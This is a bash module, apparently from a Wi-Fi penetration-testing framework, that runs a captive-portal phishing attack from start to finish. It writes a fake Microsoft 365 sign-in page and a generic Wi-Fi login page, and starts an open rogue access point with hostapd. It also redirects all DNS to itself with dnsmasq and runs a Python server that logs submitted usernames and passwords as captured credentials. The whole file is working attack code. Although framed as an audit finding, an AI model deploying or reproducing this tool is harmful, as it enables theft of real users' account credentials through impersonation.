#!/usr/bin/env bash
# MODULE_META
# NAME="Captive Portal Phishing"
# CATEGORY="F"
# DEPS="F1"
# CRITICAL="no"
# TOOLS="python3,hostapd,dnsmasq"
# DESC="Serve a phishing page to clients connected to the rogue AP"
# REQS="managed_iface,target_ssid,nat"
# PCAP="no"
# DECODE="http"

#===============================================================================
#  modules/f3_captive_portal.sh
#  F3: Captive Portal Phishing (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Deploy a rogue AP (using hostapd if needed, but here focus on Services).
#  2. Redirect all DNS queries to our local IP via dnsmasq.
#  3. Serve a professional-looking "Authentication Required" page via HTTP.
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SSID="${GUEST_SSID:-GuestWiFi}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/f3"
SCAN_TIME="${SCAN_TIME:-120}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="F3"
INTERNAL_IP="${INTERNAL_IP:-192.168.44.1}"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

echo "[*] Initializing Phishing Template System..."
echo "[?] Select Template:"
echo "    1) Generic Corporate (Internal)"
echo "    2) Microsoft 365 (High-Fidelity)"
read -p "Selection [1/2]: " template_choice

PHISH_DIR="${EVIDENCE_PREFIX}_portal"
mkdir -p "$PHISH_DIR"

if [[ "$template_choice" == "2" ]]; then
    echo "[*] Deploying Microsoft 365 template..."
    cat <<EOF > "$PHISH_DIR/index.html"
<!DOCTYPE html>
<html>
<head><title>Sign in to your account</title>
<style>
    body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
    .login-box { background: white; padding: 40px; width: 350px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
    .logo { width: 100px; margin-bottom: 20px; }
    h1 { font-size: 24px; margin-bottom: 20px; }
    input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; box-sizing: border-box; }
    input[type="submit"] { background: #0067b8; color: white; border: none; cursor: pointer; }
</style>
</head>
<body>
    <div class="login-box">
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9623595f45e6a706fdd13424d0.svg" class="logo">
        <h1>Sign in</h1>
        <form action="/login" method="POST">
            <input type="email" name="user" placeholder="Email, phone, or Skype">
            <input type="password" name="pass" placeholder="Password">
            <input type="submit" value="Next">
        </form>
    </div>
</body>
</html>
EOF
else
    echo "[*] Deploying Generic Corporate template..."
    cat <<EOF > "$PHISH_DIR/index.html"
<html>
<head><title>WiFi Authentication Required</title></head>
<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
<div style="display: inline-block; border: 1px solid #ccc; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
    <h1>WiFi Login</h1>
    <p>Please log in with your credentials to access the internet.</p>
    <form action="/login" method="POST">
        <input type="text" name="user" placeholder="Username" style="width: 100%; padding: 10px; margin: 10px 0;"><br>
        <input type="password" name="pass" placeholder="Password" style="width: 100%; padding: 10px; margin: 10px 0;"><br>
        <input type="submit" value="Connect" style="width: 100%; padding: 10px; background: #007bff; color: white; border: none; cursor: pointer;">
    </form>
</div>
</body>
</html>
EOF
fi

cat <<EOF > "$HOSTAPD_CONF"
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=${GUEST_CHANNEL:-6}
auth_algs=1
wpa=0
EOF

cat <<EOF > "$DNSMASQ_CONF"
interface=$INTERFACE
dhcp-range=192.168.44.10,192.168.44.100,12h
dhcp-option=3,$INTERNAL_IP
dhcp-option=6,$INTERNAL_IP
address=/#/$INTERNAL_IP
log-queries
log-dhcp
EOF

# 2. Cleanup function
cleanup() {
    echo "[*] Cleaning up Phishing services..."
    [[ -n "${HTTP_PID:-}" ]] && kill "$HTTP_PID" 2>/dev/null || true
    [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
    [[ -n "${DNSMASQ_PID:-}" ]] && kill "$DNSMASQ_PID" 2>/dev/null || true
}
trap cleanup EXIT

# 3. Start services
echo "[*] Starting DNS hijacker..."
dnsmasq -C "$DNSMASQ_CONF" -k --log-facility="$DNSMASQ_LOG" &
DNSMASQ_PID=$!

echo "[*] Starting Rogue AP..."
hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
HOSTAPD_PID=$!

echo "[*] Starting phishing web server with POST support..."
cat <<EOF > "$PHISH_DIR/server.py"
import http.server, socketserver, sys

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        # Log to stderr so it ends up in SERVER_LOG
        sys.stderr.write(f"\n[!] CREDENTIALS CAPTURED: {post_data.decode('utf-8')}\n")
        sys.stderr.flush()
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Success</h1><p>Connection established. You may now close this window.</p></body></html>")

socketserver.TCPServer(("", 80), Handler).serve_forever()
EOF

(
    cd "$PHISH_DIR"
    python3 server.py > "$SERVER_LOG" 2>&1
) &
HTTP_PID=$!

echo "[*] Phishing portal active for ${SCAN_TIME}s..."
sleep "$SCAN_TIME"

cleanup
trap - EXIT

# 4. Reporting
# Check if any POST data was captured (very basic check)
if grep -qi "POST" "$SERVER_LOG" 2>/dev/null; then
    echo "[!] SUCCESS: USER SUBMITTED DATA TO CAPTIVE PORTAL!"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "Portal Phishing Credential Intercepted" \
        --severity CRITICAL \
        --desc "User credentials were successfully captured via the rogue captive portal on $INTERFACE." \
        --target "Global" \
        --evidence "$SERVER_LOG" \
        --rationale "Captive portal phishing is highly effective against guest users. Intercepting these credentials can lead to full account compromise or unauthorized network access, bypassing typical wireless security."
else
    echo "[+] Phishing test complete. No credentials captured."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[F3] Audit Complete" \
        --severity INFO \
        --desc "Executed captive portal phishing attack cycle for ${SCAN_TIME}s. No user interaction detected." \
        --target "Global" \
        --evidence "$SERVER_LOG" \
        --rationale "The effectiveness of phishing depends heavily on user behavior and the visual quality of the rogue portal. This audit confirms that no users fell for the basic phishing template during the test interval."
fi

exit 0
